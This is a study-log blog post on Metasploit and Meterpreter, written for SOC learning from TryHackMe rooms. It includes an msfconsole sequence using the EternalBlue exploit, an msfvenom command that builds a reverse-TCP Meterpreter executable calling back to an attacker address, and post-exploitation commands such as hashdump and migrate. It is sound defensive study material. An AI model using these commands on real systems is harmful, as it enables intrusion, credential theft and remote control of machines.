---
title: "Cyber Security 101, Part 15: Metasploit and Meterpreter"
date: 2026-11-19 14:00:00 +0500
categories: [Daily Log, Cyber Security 101]
tags: [metasploit, meterpreter, exploitation, tryhackme]
---

**Metasploit** is a framework that brings scanning, exploitation and post-exploitation into one place. These rooms covered its main concepts, how to drive it, and **Meterpreter**, the advanced payload you often end up with. As always, I'm studying the offensive tool to understand the traces it leaves, which is what a SOC sees.

## Main concepts

Metasploit is organised around a few types of **module**:

- **Exploit:** code that takes advantage of a specific vulnerability.
- **Payload:** what runs on the target after the exploit succeeds (for example, a reverse shell).
- **Auxiliary:** tools that don't exploit, like scanners and fuzzers.
- **Encoder:** changes a payload's appearance to avoid simple detection.
- **Post:** modules for after access is gained, like gathering information.
- **NOP:** keeps payload sizes consistent.

Two payload styles matter:

- **Staged:** sent in small pieces (a small "stager" first, which then pulls the rest).
- **Single (inline):** sent all at once.

## msfconsole

**msfconsole** is the main interface. Core commands:

```
msfconsole                 # start it
search type:exploit smb    # find modules
use exploit/windows/smb/ms17_010_eternalblue   # select a module
info                       # details about the module
show options               # what you need to set
set RHOSTS 10.10.10.5      # target
set LHOST 10.8.0.5         # your machine (for reverse connections)
exploit                    # run it (or "run")
```

The flow is always: search, use, set the options, run.

## Working with modules

`show options` lists the settings a module needs. The common ones:

- **RHOSTS:** the remote target(s)
- **RPORT:** the target port
- **LHOST:** your machine's address, where a reverse connection comes back
- **LPORT:** the port you listen on
- **PAYLOAD:** what to run on success

## Metasploit exploitation

The exploitation room walked through a full attack:

1. **Scanning:** auxiliary scanner modules (and imported Nmap results) find services.
2. **The Metasploit database:** running `msfdb` and `db_nmap` stores hosts, services and findings so you can track a larger engagement.
3. **Vulnerability scanning:** modules check whether a found service is vulnerable.
4. **Exploitation:** pick a matching exploit, set options, run it, and get a session.

### msfvenom

**msfvenom** is the standalone tool for creating payloads as files, for cases where you deliver the payload yourself rather than through an exploit:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.0.5 LPORT=4444 -f exe -o shell.exe
```

- `-p` chooses the payload
- `-f` the format (exe, elf, php, etc.)
- `-o` the output file

A listener (the `multi/handler` module) is then set up to catch the connection when the file is run.

## Meterpreter

**Meterpreter** is Metasploit's advanced payload. Instead of a plain shell, it's a feature-rich agent that runs **in memory** (which helps it avoid leaving a file on disk) and talks to Metasploit over an encrypted channel.

### Why it's used

It gives a stable, powerful foothold with many built-in commands, so you don't need to upload separate tools for each task.

### Famous commands

```
sysinfo             # OS and machine details
getuid              # current user
getprivs            # privileges held
ps                  # running processes
migrate <pid>       # move into another process
hashdump            # dump password hashes (needs high privileges)
screenshot          # capture the screen
download / upload   # move files
shell               # drop to a normal system shell
```

### Post-exploitation

After getting a Meterpreter session, the attacker does **post-exploitation**: gathering information, escalating privileges, dumping credentials, and moving to other machines (**lateral movement**). `migrate` is a favourite, because moving into a stable system process makes the session more reliable and harder to spot.

## Why this matters for a SOC engineer

Metasploit is loud if you know what to look for. The traces include:

- new, unexpected **network connections** back to the attacker (the reverse shell), often on ports like 4444
- **process injection** and migration, which EDR tools watch for
- **credential dumping** attempts like `hashdump`
- payload files created by msfvenom, which antivirus and file hashing can catch
- default module settings that leave recognisable signatures

A SOC doesn't need to use Metasploit to attack; it needs to recognise what its activity looks like in process logs, network connections and EDR alerts. Knowing the tool from the inside makes those alerts much easier to read.

## Questions I should be able to answer

- What are the main Metasploit module types?
- What's the difference between a staged and a single payload?
- What do RHOSTS, LHOST and LPORT mean?
- What does msfvenom do, and what catches the connection it creates?
- What is Meterpreter, and why is running in memory useful to an attacker?
- What does `migrate` do, and why?
- Name three traces Metasploit activity leaves for a SOC.

## Next

Tonight: shells. The different ways attackers get command-line access, and how to spot them.
